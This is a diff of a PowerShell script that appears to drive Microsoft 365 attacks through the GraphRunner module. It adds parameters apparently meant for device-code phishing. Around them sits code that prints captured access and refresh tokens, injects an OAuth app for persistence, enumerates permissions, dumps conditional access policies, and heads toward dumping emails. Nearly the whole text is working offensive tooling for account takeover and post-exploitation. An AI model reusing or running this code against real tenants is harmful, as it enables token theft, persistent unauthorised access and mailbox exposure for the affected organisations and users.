@@ -23,7 +23,12 @@ param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$AppName,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$Scope
+    [string]$Scope,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$CaptureCode, # Generate a CaptureCode elsewhere, use it? Will try
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$DeviceCode # Generate a Code elsewhere, pass to templating module and replace.ps1
+
 
 )
 
@@ -128,7 +133,7 @@ if ($persistence) {
             Write-Host "Access Token from tokens object: $($tokens.access_token)"
             Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
         }
-        Import-Module .\Modules\GraphRunner.ps1
+        . .\Modules\GraphRunner.ps1
         Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token
         Invoke-InjectOAuthApp -AppName $AppName -ReplyUrl $ReplyUrl -scope $Scope -Tokens $tokens # *> .\Persistence.json 
         Stop-Transcript
@@ -154,7 +159,7 @@ if ($GraphRecon) {
             Write-Host "Access Token from tokens object: $($tokens.access_token)"
             Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
         }
-        Import-Module .\Modules\GraphRunner.ps1
+        . .\Modules\GraphRunner.ps1
         Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token
         Invoke-GraphRecon -Tokens $tokens -PermissionEnum
         Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
@@ -167,8 +172,6 @@ if ($GraphRecon) {
         # exit 1
     }
 }
-
-
 
 
 ### Refresh to Graph, Dump emails
